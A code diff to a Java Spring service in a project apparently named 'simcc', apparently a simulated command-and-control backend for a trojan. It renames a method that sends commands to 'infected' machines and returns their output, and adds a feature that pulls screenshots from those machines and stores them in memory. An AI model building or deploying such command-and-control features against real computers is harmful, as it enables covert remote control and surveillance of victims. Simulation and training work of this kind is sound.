@@ -6,6 +6,7 @@ import at.simcc.simcc_backend.api.ws.MessageType;
 import at.simcc.simcc_backend.api.ws.WebsocketHandler;
 import at.simcc.simcc_backend.api.ws.payload.CommandOutputPayload;
 import at.simcc.simcc_backend.api.ws.payload.CommandPayload;
+import at.simcc.simcc_backend.api.ws.payload.ScreenshotPayload;
 import at.simcc.simcc_backend.entities.Infected;
 import at.simcc.simcc_backend.entities.InfectedIP;
 import at.simcc.simcc_backend.entities.Trojan;
@@ -16,7 +17,6 @@ import at.simcc.simcc_backend.repo.InfectedRepository;
 import at.simcc.simcc_backend.repo.TrojanRepository;
 import jakarta.persistence.EntityNotFoundException;
 import lombok.RequiredArgsConstructor;
-import org.jspecify.annotations.Nullable;
 import org.springframework.stereotype.Service;
 import tools.jackson.databind.ObjectMapper;
 
@@ -24,6 +24,7 @@ import java.io.IOException;
 import java.net.Inet4Address;
 import java.time.LocalDate;
 import java.util.*;
+import java.util.concurrent.ConcurrentHashMap;
 import java.util.concurrent.ExecutionException;
 import java.util.concurrent.TimeoutException;
 
@@ -42,6 +43,8 @@ public class InfectedService {
     private final InfectedMapper infectedMapper;
     private final WebsocketHandler websocketHandler;
     private final ObjectMapper objectMapper;
+
+    private final ConcurrentHashMap<UUID, byte[]> SCREENSHOTS = new ConcurrentHashMap<>();
 
     /**
      * Register a new infected machine using a {@code ccid}
@@ -111,7 +114,7 @@ public class InfectedService {
         return infectedDtos;
     }
 
-    public CommandOutputPayload sendMessage(UUID iid, CommandPayload command) throws IOException, ExecutionException, InterruptedException, TimeoutException {
+    public CommandOutputPayload sendCommand(UUID iid, CommandPayload command) throws IOException, ExecutionException, InterruptedException, TimeoutException {
         return (CommandOutputPayload) websocketHandler.sendMessageToInfectedAndWait(iid,
                 SimccMessage.builder()
                         .type(MessageType.COMMAND)
@@ -120,5 +123,36 @@ public class InfectedService {
                                         command
                                 )
                         ).build());
+    }
+
+    /**
+     * Request a screenshot
+     * @param iid of the infected system
+     * @return the id of the screenshot
+     * @throws IOException
+     * @throws ExecutionException
+     * @throws InterruptedException
+     * @throws TimeoutException
+     */
+    public UUID requestScreenshot(UUID iid) throws IOException, ExecutionException, InterruptedException, TimeoutException {
+        ScreenshotPayload payload = (ScreenshotPayload) websocketHandler.sendMessageToInfectedAndWait(iid,
+                SimccMessage.builder()
+                        .type(MessageType.SCREENSHOT_REQUEST)
+                        .build()
+                );
+
+        UUID screenshotID = UUID.randomUUID();
+
+        SCREENSHOTS.put(screenshotID, payload.getImageData());
+
+        return screenshotID;
+    }
+
+    public Optional<byte[]> getScreenshot(UUID screenshotID) {
+        if (SCREENSHOTS.containsKey(screenshotID)) {
+            return Optional.of(SCREENSHOTS.get(screenshotID));
+        }
+
+        return Optional.empty();
     }
 }
